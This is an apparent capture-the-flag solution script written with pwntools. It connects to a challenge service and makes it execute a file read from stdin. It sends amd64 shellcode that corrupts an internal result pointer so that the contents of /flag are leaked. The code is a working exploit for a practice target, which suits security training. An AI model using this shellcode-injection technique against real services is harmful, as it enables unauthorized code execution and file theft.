from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
# io.interactive()

# s = process("./challenge")

def cmd(idx):
    s.sendlineafter(b"Choice: ",str(idx).encode())

def runfile(filename):
    cmd(1)
    s.sendlineafter(b"> ",filename)

def show():
    cmd(2)

context.arch = 'amd64'
context.terminal = ['tmux','split','-h']

runfile(b"/flag")
runfile(b"/proc/self/fd/0")
shellcode = '''
    mov rdi,[rbp-0x28]
    mov rsi,rdx
    // -0x2000+alloc_base-4=fake_result+8
    // fake_result=alloc_base+0x2000-12
    sub rsi,8204
    mov [rdi+0x60],rsi
    ret
'''
shellcode = asm(shellcode)
s.send(shellcode)

runfile(b"/proc/self/fd/0")
shellcode = '''
    mov rdi,[rbp-0x28]
    mov rsi,rdx
    // -0x2000+alloc_base-4=fake_result+8
    // fake_result=alloc_base+0x2000-12
    sub rsi,8204
    mov [rdi+0x60],rsi
    ret
'''
shellcode = asm(shellcode)
s.send(shellcode)

show()
flag = s.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
s.interactive()